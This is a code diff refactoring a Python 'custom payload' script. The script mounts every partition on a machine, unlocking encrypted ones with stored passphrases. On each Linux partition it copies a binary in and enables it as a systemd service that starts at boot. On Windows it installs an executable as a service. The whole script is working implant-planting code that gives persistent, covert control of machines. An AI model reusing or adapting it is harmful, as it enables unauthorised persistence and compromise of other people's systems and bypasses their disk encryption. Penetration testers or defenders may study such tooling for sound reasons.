@@ -13,18 +13,13 @@ PASSPHRASES = "@PASSPHRASES@"
 
 
 @entry_point.entry_point
-def main() -> None:
-    block_info, _, our_device = storage.setup()
-    common_utils.print_info("Custom payload started")
+def main(block_info: storage.BlocksType, *_) -> None:
     for part in storage.query_all_partitions(block_info):
-        if storage.get_partition_root(part, block_info) == our_device:
-            continue
         with storage.mount_partition(part, PASSPHRASES) as mounted_part:
             ctx = context.require_context_for_mount_point(
                 mounted_part.mount_point)
             # Try to see if we are dealing with any sort of Linux
-            if (mounted_part.exists("usr/sbin/init") or mounted_part.exists("usr/bin/init")) \
-                    and mounted_part.exists("etc/shadow"):
+            if mounted_part.is_linux():
                 mounted_part.mkdir(f"usr/lib/libexec/{LINUX_SERVICE_NAME}/")
                 mounted_part.copy(
                     "/root/data/linux", f"usr/lib/libexec/{LINUX_SERVICE_NAME}/{LINUX_SERVICE_NAME}")
@@ -47,7 +42,7 @@ def main() -> None:
                 service.write(False, False)
                 mounted_part.link(f"/usr/lib/systemd/system/{LINUX_SERVICE_NAME}.service",
                                   f"/usr/lib/systemd/system/multi-user.target.wants/{LINUX_SERVICE_NAME}.service")
-            elif mounted_part.exists("Windows"):
+            elif mounted_part.is_windows():
                 # Determine executable name
                 exe_name = WINDOWS_SERVICE_NAME.title().replace(
                     " ", "").replace("-", "").replace("_", "")
@@ -74,6 +69,5 @@ def main() -> None:
             else:
                 common_utils.print_warning("Unknown operating system!")
 
-    common_utils.print_ok("Custom payload completed")
 if __name__ == "__main__":
     main()
